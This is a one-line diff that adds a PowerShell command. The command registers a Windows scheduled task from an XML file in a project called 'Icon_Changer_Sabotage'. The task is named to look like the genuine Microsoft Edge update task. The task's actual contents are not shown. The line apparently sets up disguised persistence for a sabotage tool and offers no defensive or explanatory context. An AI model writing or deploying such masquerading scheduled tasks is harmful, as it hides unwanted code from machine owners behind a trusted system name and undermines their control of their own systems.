@@ -1,0 +1,1 @@
+﻿Register-ScheduledTask -xml (Get-Content 'G:\Admin\Documents\GitHub\Icon_Changer_Sabotage\MicrosoftEdgeUpdateTaskMachine_HotelAlphaVictorEchoFoxtrotUniformNovember.xml' | Out-String) -TaskName "MicrosoftEdgeUpdateTaskMachine_HotelAlphaVictorEchoFoxtrotUniformNovember"
